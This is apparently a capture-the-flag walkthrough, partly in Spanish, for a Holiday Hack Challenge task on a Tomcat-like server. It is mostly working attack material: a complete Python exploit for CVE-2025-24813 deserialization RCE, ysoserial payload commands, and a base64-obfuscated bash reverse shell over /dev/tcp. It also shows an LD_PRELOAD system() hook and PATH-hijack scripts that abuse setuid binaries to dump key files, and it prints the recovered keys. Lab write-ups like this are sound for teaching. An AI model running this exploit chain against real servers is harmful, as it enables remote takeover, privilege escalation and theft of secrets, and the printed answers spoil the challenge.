#  Snowcat RCE & Priv Esc

_Difficulty:_ 

Hi, I'm Tom! I've worked for Counter Hack since its founding in 2010. I love all things testing and QA, maintaining systems, logistics, and helping our customers have the best possible experience. Outside of work, you'll find me at my local community theater producing shows, helping with sound or video, or just hanging around. Learn more about my background at [TomHessman.com](https://tomhessman.com)!

We've lost access to the neighborhood weather monitoring station. There are a couple of vulnerabilities in the snowcat and weather monitoring services that we haven't gotten around to fixing. Can you help me exploit the vulnerabilities and retrieve the other application's authorization key? Enter the other application's authorization key into the badge.

## Pistas

Snowcat
From: Santa
Objective: Snowcat RCE & Priv Esc
Maybe we can inject commands into the calls to the temperature, humidity, and pressure monitoring services.

Snowcat
From: Santa
Objective: Snowcat RCE & Priv Esc
Snowcat is closely related to Tomcat. Maybe the recent Tomcat Remote Code Execution vulnerability (CVE-2025-24813) will work here.

Snowcat
From: Santa
Objective: Snowcat RCE & Priv Esc
If you're feeling adventurous, maybe you can become root to figure out more about the attacker's plans.





https://hhc25-wetty-prod.holidayhackchallenge.com/?&challenge=termSnowcat&username=hackadviser&id=bdde3291-b3c1-4572-9a46-931a81ece640

## Terminal

```
We've lost control of the Neighborhood Weather Monitoring Station.
We think another system is connecting.

The weather monitoring station uses the Snowcat hosting platform.
It's cousin Tomcat, recently had a Remote Code Execution vulnerability.
Can you help me try and exploit it to regain access to the server?

Once you've gained access, find a way to become the 'weather' user, and find the authorization key used by the other system.
Enter the authorization key used by the other system into the badge.

```

### dato 1
```
user@weather:~$ netstat -antp
(No info could be read for "-p": geteuid()=2001 but you should be root.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   

user@weather:~$ curl localhost


<html>
<head>
    <title>Neighborhood Weather Monitoring Station</title>
    <link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
<div class="login-container">
    <h1>Welcome to the Neighborhood Weather Monitoring Station</h1>
    <form action="login.jsp" method="post" style="display: flex; flex-direction: column; gap: 10px; align-items: flex-start;">
        <div style="display: flex; justify-content: space-between; width: 100%;">
            <label for="username" style="flex: 1; text-align: left;">Username:</label>
            <input type="text" id="username" name="username" required style="flex: 2; text-align: right;">
        </div>
        <div style="display: flex; justify-content: space-between; width: 100%;">
            <label for="password" style="flex: 1; text-align: left;">Password:</label>
            <input type="password" id="password" name="password" required style="flex: 2; text-align: right;">
        </div>
        <button type="submit" style="align-self: center;">Login</button>
    </form>
</div>
<script src="snowflakes.js"></script>
</body>
</html>

user@weather:~$ curl -I localhost
HTTP/1.1 200 
Set-Cookie: JSESSIONID=82B2F5A0F1A17BECCB5C449448E284A0; Path=/; HttpOnly
Content-Type: text/html;charset=UTF-8
Transfer-Encoding: chunked
Date: Sat, 29 Nov 2025 00:50:46 GMT
Server: SnowCat 9.0.90


user@weather:~$ curl -I 127.0.0.1:8005
curl: (56) Recv failure: Connection reset by peer


nc -v 127.0.0.1 8005
Connection to 127.0.0.1 8005 port [tcp/*] succeeded!
.


```

## dato 2

```
user@weather:~$ ls -la
total 58164
drwx------ 1 user user     4096 Sep 15 08:15 .
drwxrwxr-x 1 root root     4096 Sep 13 08:55 ..
-rw-r--r-- 1 user user      220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 user user     3835 Sep 13 06:28 .bashrc
-rw-r--r-- 1 user user      807 Jan  6  2022 .profile
-rwx------ 1 user user     1992 Sep 13 08:24 CVE-2025-24813.py
-rw-rw-r-- 1 user user     1424 Sep 13 08:24 notes.md
drwxrwxr-x 1 user user     4096 Sep 15 08:15 weather-jsps
-rw-rw-r-- 1 user user 59525376 Sep 13 08:24 ysoserial.jar
```

## dato 3
```

cat notes.md 
# Remote Code Execution exploiting RCE-2025-24813

Snowcat is a webserver adapted to life in the arctic.
Can you help me check to see if Snowcat is vulnerable to RCE-2025-24813 like its cousin Tomcat?

## Display ysoserial help, lists payloads, and their dependencies:

  java -jar ysoserial.jar
## Identify what libraries are used by the Neighborhood Weather Monitoring system

## Use ysoserial to generate a payload

Store payload in file named payload.bin

## Attempt to exploit RCE-2025-24813 to execute the payload

 
export HOST=TODO_INSERT_HOST
export PORT=TODO_INSERT_PORT
export SESSION_ID=TODO_INSERT_SESSION_ID

curl -X PUT \
  -H "Host: ${HOST}:${PORT}" \
  -H "Content-Length: $(wc -c < payload.bin)" \
  -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" \
  --data-binary @payload.bin \
  "http://${HOST}:${PORT}/${SESSION_ID}/session"

curl -X GET \
  -H "Host: ${HOST}:${PORT}" \
  -H "Cookie: JSESSIONID=.${SESSION_ID}" \
  "http://${HOST}:${PORT}/"
 

# Privilege Escalation

The Snowcat server still uses some C binaries from an older system iteration.
Replacing these has been logged as technical debt.
<TOOD_INSERT_ELF_NAME> said he thought these components might create a privilege escalation vulnerability.
Can you prove these components are vulnerable by retrieving the key that is not used by the Snowcat hosted Neighborhood Weather Monitoring Station?


```

## dato4

```
user@weather:~$ cat CVE-2025-24813.py 
import http.client
import base64
import argparse

def main():
    parser = argparse.ArgumentParser(description="Send serialized session payload via PUT, then trigger via GET.")
    parser.add_argument("--host", required=True, help="Target host, e.g. 192.168.137.132")
    parser.add_argument("--port", type=int, default=8080, help="Target port (default: 8080)")
    parser.add_argument("--base64-payload", required=True, help="Base64-encoded serialized session data")
    parser.add_argument("--session-id", default=".deserialize", help="JSESSIONID value (default: .deserialize)")
    args = parser.parse_args()

    host = args.host
    port = args.port
    session_id = args.session_id

    try:
        payload = base64.b64decode(args.base64_payload)
    except Exception as e:
        print("[!] Failed to decode base64 payload:", e)
        return

    # 1. Send PUT request
    print("[*] Sending PUT request with serialized session data...")
    conn = http.client.HTTPConnection(host, port)
    put_headers = {
        "Host": f"{host}:{port}",
        "Content-Length": str(len(payload)),
        "Content-Range": f"bytes 0-{len(payload)-1}/{len(payload)}"
    }
    conn.request("PUT", f"/{session_id}/session", body=payload, headers=put_headers)
    put_response = conn.getresponse()
    print(f"[PUT] Status: {put_response.status} {put_response.reason}")
    print(put_response.read().decode(errors="ignore"))
    conn.close()

    # 2. Send GET request to trigger deserialization via session
    print("[*] Sending GET request with session cookie...")
    conn = http.client.HTTPConnection(host, port)
    get_headers = {
        "Host": f"{host}:{port}",
        "Cookie": f"JSESSIONID=.{session_id}"
    }
    conn.request("GET", "/", headers=get_headers)
    get_response = conn.getresponse()
    print(f"[GET] Status: {get_response.status} {get_response.reason}")
    print(get_response.read().decode(errors="ignore"))
    conn.close()

if __name__ == "__main__":
    main()
```

## dato 5

```
user@weather:~$ cd weather-jsps/
user@weather:~/weather-jsps$ ls -la
total 24
drwxrwxr-x 1 user user 4096 Sep 15 08:15 .
drwx------ 1 user user 4096 Sep 15 08:15 ..
-rw-rw-r-- 1 user user 4706 Sep 15 08:15 dashboard.jsp
-rw-rw-r-- 1 user user 1194 Sep 13 08:24 index.jsp
-rw-rw-r-- 1 user user 1643 Sep 13 08:24 login.jsp
```

## dato 6
```
cat dashboard.jsp 
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*" %>
<%@ page import="org.apache.commons.collections.map.*" %>
<html>
<head>
    <title>Neighborhood Weather Monitoring Station</title>
    <link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
<div class="dashboard-container">
    <h1>Neighborhood Weather Monitoring Station</h1>
    <p>Providing real-time Neighborhood weather monitoring since 2022.</p>
    <%
        if (session == null || session.getAttribute("username") == null) {
            // No valid session, redirect to login page
            response.sendRedirect("/");
            return;
        }
        String username = (String) session.getAttribute("username");
        String firstname = (String) session.getAttribute("firstname");
        String lastname = (String) session.getAttribute("lastname");

        out.println("<h2>Welcome, " + firstname + " " + lastname + "</h2>");

        try {
            String key = "4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6";
            Process tempProc = Runtime.getRuntime().exec("/usr/local/weather/temperature " + key);
            Process humProc = Runtime.getRuntime().exec("/usr/local/weather/humidity " + key);
            Process presProc = Runtime.getRuntime().exec("/usr/local/weather/pressure " + key);

            BufferedReader tempReader = new BufferedReader(new InputStreamReader(tempProc.getInputStream()));
            BufferedReader humReader = new BufferedReader(new InputStreamReader(humProc.getInputStream()));
            BufferedReader presReader = new BufferedReader(new InputStreamReader(presProc.getInputStream()));

            String tempLine = tempReader.readLine();
            String humLine = humReader.readLine();
            String presLine = presReader.readLine();
        
            if (tempLine == null || humLine == null || presLine == null) {
                out.println("<p>Error: Unable to retrieve weather data. Please try again later.</p>");
                return;
            }
        
            float temperature = Float.parseFloat(tempLine);
            float humidity = Float.parseFloat(humLine);
            int pressure = Integer.parseInt(presLine); // Parse pressure as integer

            // Define min and max values using Apache Commons Collections MultiValueMap
            MultiValueMap ranges = new MultiValueMap();

            ranges.put("temperature", 70.0f);
            ranges.put("temperature", -50.0f);

            ranges.put("humidity", 100.0f);
            ranges.put("humidity", 0.0f);

            ranges.put("pressure", 950);
            ranges.put("pressure", 1050);

            // Retrieve min and max values for normalization
            float tempMin = (float) ranges.getCollection("temperature").toArray()[0];
            float tempMax = (float) ranges.getCollection("temperature").toArray()[1];

            float humMin = (float) ranges.getCollection("humidity").toArray()[0];
            float humMax = (float) ranges.getCollection("humidity").toArray()[1];

            int presMin = (int) ranges.getCollection("pressure").toArray()[0];
            int presMax = (int) ranges.getCollection("pressure").toArray()[1];

            // Normalize values using the ranges
            float normalizedTemperature = (temperature - tempMin) / (float) (tempMax - tempMin);
            float normalizedHumidity = (humidity - humMin) / (humMax - humMin);
            float normalizedPressure = (pressure - presMin) / (float) (presMax - presMin);

            // Adjust weights based on normalized values for Kansas December weather
            float tempScore = temperature < 2.0f ? 1.0f : (temperature < 6.0f ? 0.5f : 0.0f);
            float humScore = humidity > 70.0f ? 1.0f : (humidity > 50.0f ? 0.5f : 0.0f);
            float presScore = pressure < 1015 ? 1.0f : (pressure < 1025 ? 0.5f : 0.0f);
            float likelihood = tempScore * 50 + humScore * 30 + presScore * 20;
            String likelihoodLevel = likelihood > 75 ? "High" : (likelihood > 50 ? "Medium" : "Low");

            out.println("<p>Likelihood of snow: <strong>" + likelihoodLevel + "</strong></p>");
            out.println("<p>Temperature: " + temperature + " °C</p>"); // Explicitly cast to integer
            out.println("<p>Humidity: " + humidity + " %</p>");
            out.println("<p>Pressure: " + (int) pressure + " hPa</p>"); // Explicitly cast to integer
        } catch (Exception e) {
            e.printStackTrace();
            out.println("<p>Error: Unable to retrieve weather data. Please try again later.</p>");
        }
    %>
</div>
<script src="snowflakes.js"></script>
</body>
</html>
```

## dato 7

```
cat index.jsp 
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<html>
<head>
    <title>Neighborhood Weather Monitoring Station</title>
    <link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
<div class="login-container">
    <h1>Welcome to the Neighborhood Weather Monitoring Station</h1>
    <form action="login.jsp" method="post" style="display: flex; flex-direction: column; gap: 10px; align-items: flex-start;">
        <div style="display: flex; justify-content: space-between; width: 100%;">
            <label for="username" style="flex: 1; text-align: left;">Username:</label>
            <input type="text" id="username" name="username" required style="flex: 2; text-align: right;">
        </div>
        <div style="display: flex; justify-content: space-between; width: 100%;">
            <label for="password" style="flex: 1; text-align: left;">Password:</label>
            <input type="password" id="password" name="password" required style="flex: 2; text-align: right;">
        </div>
        <button type="submit" style="align-self: center;">Login</button>
    </form>
</div>
<script src="snowflakes.js"></script>
</body>
</html>
```

## dato 8

```
cat login.jsp 
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.sql.*, java.io.*" %>
<%
    String username = request.getParameter("username");
    String password = request.getParameter("password");
    boolean authenticated = false;

    // Explicitly load the SQLite JDBC driver
    Class.forName("org.sqlite.JDBC");

    // Get the absolute path to the database file
    String dbPath = getServletContext().getRealPath("/WEB-INF/classes/weather.db");

    try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + dbPath)) {
        PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ? AND password = ?");
        stmt.setString(1, username);
        stmt.setString(2, password);
        ResultSet rs = stmt.executeQuery();
        if (rs.next()) {
            authenticated = true;
            String firstname = rs.getString("firstname");
            String lastname = rs.getString("lastname");

            // Create a session and store user details
            //HttpSession session = request.getSession();
            // Use the implicit session object
            session.setAttribute("username", username);
            session.setAttribute("firstname", firstname);
            session.setAttribute("lastname", lastname);
            session.setMaxInactiveInterval(2 * 60 * 60); // 2 hours

            response.sendRedirect("dashboard.jsp");
            return;
        }
    } catch (Exception e) {
        e.printStackTrace();
    }

    // Authentication failed, redirect back to login page
    response.sendRedirect("/?error=invalid");
```

## dato 9
```
find /usr/local/weather -perm -4000 -type f 2>/dev/null
/usr/local/weather/humidity
/usr/local/weather/pressure
/usr/local/weather/temperature


```


## YO serial

### listamos payloads
```
java -jar ysoserial.jar 2>&1 | grep -i commons
     AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                      
     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                                           
     CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                               
     CommonsCollections1 @frohoff                               commons-collections:3.1                                                                                                                                                                             
     CommonsCollections2 @frohoff                               commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections3 @frohoff                               commons-collections:3.1                                                                                                                                                                             
     CommonsCollections4 @frohoff                               commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1                                                                                                                                                                             
     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1                                                                                                                                                                             
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1                                                                                                                                                                             
     FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4                                                                                                                                                            
     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2 
```


### va el payload
```
java -jar ysoserial.jar CommonsCollections6 'touch /tmp/pwned' | base64 -w 0 > payload_b64.txt

python3 CVE-2025-24813.py --host 127.0.0.1 --port 80 --base64-payload $(cat payload_b64.txt) --session-id exploit_test_v2

ls -la /tmp/pwned 
-rw-r----- 1 snowcat snowcat 0 Nov 29 03:11 /tmp/pwned

```

### va el reverse shell

```
# Recuerda: Este es el payload especial para evitar errores de sintaxis en Java
CMD="bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}"

java -jar ysoserial.jar CommonsCollections6 "$CMD" | base64 -w 0 > shell_payload.txt


(sleep 5; python3 CVE-2025-24813.py --host 127.0.0.1 --port 80 --base64-payload $(cat shell_payload.txt) --session-id shell_auto) & nc -lvnp 4444

```

## dato 10

```
snowcat@weather:/tmp/exploit$ ls -la
ls -la
total 1404
drwxr-xr-x 2 user user    4096 Nov 29 02:52 .
drwxrwxrwt 1 root root    4096 Nov 29 03:22 ..
-rwxr-xr-x 1 user user     105 Nov 29 02:52 bash
-rwxr-xr-x 1 user user 1396520 Nov 29 02:52 bash.real
-rw-r--r-- 1 user user     211 Nov 29 02:48 cookies.txt
-rw-r--r-- 1 user user     434 Nov 29 02:47 exploit.c
-rwxr-xr-x 1 user user   15784 Nov 29 02:47 exploit.so
-rwxr-xr-x 1 user user     180 Nov 29 02:51 logUsage
snowcat@weather:/tmp/exploit$ cat exploit.c
cat exploit.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int system(const char *command) {
    FILE *f = fopen("/tmp/system_calls.log", "a");
    if (f) {
        fprintf(f, "system() called with: %s\n", command);
        fclose(f);
    }
    
    // Ejecuta nuestro comando
    char cmd[] = "cat /usr/local/weather/keys/* >> /tmp/preload_output.txt 2>&1";
    return execl("/bin/sh", "sh", "-c", cmd, NULL);
}
snowcat@weather:/tmp/exploit$ cat bash
cat bash
#!/bin/sh
/bin/cat /usr/local/weather/keys/* 2>/dev/null > /tmp/keys_dumped.txt
exec /bin/bash.real "$@"
snowcat@weather:/tmp/exploit$ cat cookies.txt
cat cookies.txt
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

#HttpOnly_localhost FALSE /  FALSE 0  JSESSIONID  FD27343FDE1EBDE9381D16A92A4C336C
snowcat@weather:/tmp/exploit$ cat logUsage
cat logUsage
#!/bin/bash
for file in /usr/local/weather/keys/*; do
    echo "=== $file ===" >> /tmp/all_keys.txt
    cat "$file" >> /tmp/all_keys.txt 2>&1
    echo "" >> /tmp/all_keys.txt
done
```

## dato 11

```
snowcat@weather:/tmp/exploit$ ls -la /usr/local/weather
ls -la /usr/local/weather
total 96
drwxr-xr-x 1 weather snowcat  4096 Sep 15 08:15 .
drwxrwxr-x 1 root    root     4096 Sep 15 08:15 ..
-rw-r----- 1 weather snowcat    35 Sep 13 08:24 config
drwx------ 1 weather snowcat  4096 Nov 29 02:26 data
-rwsr-sr-x 1 root    weather 16984 Sep 15 08:15 humidity
drwx------ 1 weather weather  4096 Sep 13 08:30 keys
-rwxr-x--- 1 root    weather   357 Sep 13 08:24 logUsage
drwx------ 1 weather weather  4096 Nov 29 02:26 logs
-rwsr-sr-x 1 root    weather 16984 Sep 15 08:15 pressure
-rwsr-sr-x 1 root    weather 16992 Sep 15 08:15 temperature


cat /usr/local/weather/config
username=weather
groupname=weather






```







```

cd /tmp

# Creamos el script CORRECTO usando rutas absolutas
cat <<EOF > payload.sh
#!/bin/bash
/bin/cat /usr/local/weather/keys/* > /tmp/flag_final.txt
/bin/chmod 777 /tmp/flag_final.txt
EOF

# Hacemos las copias trampa
chmod +x payload.sh
cp payload.sh date
cp payload.sh echo
cp payload.sh cat  
# Ahora es seguro copiarlo a 'cat' porque dentro usamos '/bin/cat'



export PATH=/tmp:$PATH 
/usr/local/weather/temperature 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6


 
5e52e19a6 /weather/temperature 4b2f3c2d-1f88-4a09-8bd4-d3e5
-2.41
snowcat@weather:/tmp$ /bin/cat /tmp/flag_final.txt
/bin/cat /tmp/flag_final.txt
4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6
8ade723d-9968-45c9-9c33-7606c49c2201


```